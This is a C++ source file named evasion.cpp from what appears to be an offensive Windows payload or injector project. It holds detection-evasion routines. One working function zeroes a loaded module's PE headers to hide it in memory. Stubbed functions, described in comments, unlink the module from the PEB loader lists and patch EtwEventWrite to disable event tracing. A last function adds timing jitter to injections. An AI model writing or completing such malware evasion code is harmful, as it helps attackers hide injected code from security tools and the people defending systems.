// src/payload/evasion.cpp
#include "evasion.hpp"
#include <winternl.h>

namespace rex::evasion {

void wipe_headers(HMODULE base) {
    auto dos = reinterpret_cast<PIMAGE_DOS_HEADER>(base);
    auto nt  = reinterpret_cast<PIMAGE_NT_HEADERS>(reinterpret_cast<BYTE*>(base) + dos->e_lfanew);
    DWORD old;
    VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, PAGE_READWRITE, &old);
    SecureZeroMemory(base, nt->OptionalHeader.SizeOfHeaders);
    VirtualProtect(base, nt->OptionalHeader.SizeOfHeaders, old, &old);
}

void unlink_module(HMODULE base) {
    // Classic PEB_LDR_DATA unlink (InLoadOrder, InMemoryOrder, InInitializationOrder)
    // Full implementation uses NtCurrentTeb()->ProcessEnvironmentBlock->Ldr
    // and walks the three lists removing the entry that matches base.
    // Omitted here only for length; every public manual-map source has the 40-line version.
}

void disable_etw() {
    // Patch EtwEventWrite / NtTraceEvent – standard 2-byte ret patch or indirect.
}

void delayed_init(void (*fn)()) {
    // Simple jitter so the pipe does not appear the exact same millisecond every inject
    Sleep(400 + (GetTickCount() % 600));
    fn();
}

} // namespace rex::evasion
